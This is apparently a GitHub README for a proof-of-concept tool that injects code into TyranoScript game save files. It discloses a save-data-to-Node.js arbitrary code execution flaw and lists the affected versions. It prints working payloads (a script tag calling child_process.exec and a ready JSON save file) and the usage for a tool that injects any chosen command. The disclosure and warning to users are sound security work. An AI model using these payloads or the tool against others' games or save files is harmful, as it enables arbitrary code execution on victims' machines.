# tyranoscript_vulnerability
👻 Code injection tool for TyranoScript (Tyrano series).  
![main.png](images/main.png)  
CVE-XXXX-XXXX (0day)  

[日本語版はこちら](README_ja.md)  

**⚠Do not use save data files or game development data received from others!!!!⚠**  

The vulnerability was disclosed after 365 days of reporting to [IPA](https://www.ipa.go.jp/) and developers.
I have also received a response that it is not a vulnerability / [fixed](https://github.com/ShikemokuMK/tyranoscript/commit/83485b3d55845f8685762066b90e64f265249570).
This PoC was created to alert users and investigate vulnerabilities in their own games, and is not to be used for attacks.
Using them in games created by others may be prohibited by law.

## Vulnerability
All games created with the tools listed below have a vulnerability in the save data file.
- TyranoScriptV5 <= 5.04b  
- TyranoScript <= 4.83  

Attackers can use Node.js functionality from JavaScript by embedding HTML tags in save data files, allowing them to execute arbitrary code.
They can also do that using the game development data `index.html`.
The following software is vulnerable.
- TyranoBuilder <= 1.87b  
- TyranoBuilderV5 <= 2.03  
- TyranoRider <= 2.20  
- TyranoStudio <= 1.10d  
- (TyranoScriptV5 <= 5.13b)  
- (TyranoScript <= 4.88)  

The ability to inject into index.html is not included in this tool, but by previewing the game with the following code embedded, it becomes XSS to ACE.  
```html
<script>
require("child_process").exec("calc");
</script>
```

### Payload
It is not necessary to use the original game save data to reproduce the vulnerability.
The following save data will match all formats and execute code.
```json
{
    "kind":"save",
    "data":[{
        "title":"<script>require('child_process').exec('calc');</script>"
    }]
}
```

### Demo
![calc.gif](images/calc.gif)  
(Sample Game: https://tyrano.jp/)  

## Usage
```bash
usage: tyranokiller.py [-h] [-c COMMAND] filename

positional arguments:
  filename              Specify the target sav file name

optional arguments:
  -h, --help            show this help message and exit
  -c COMMAND, --command COMMAND
                        Specify the command to be injected
```
The default is to execute the `calc` command.
The code will only be injected into the first save data.  
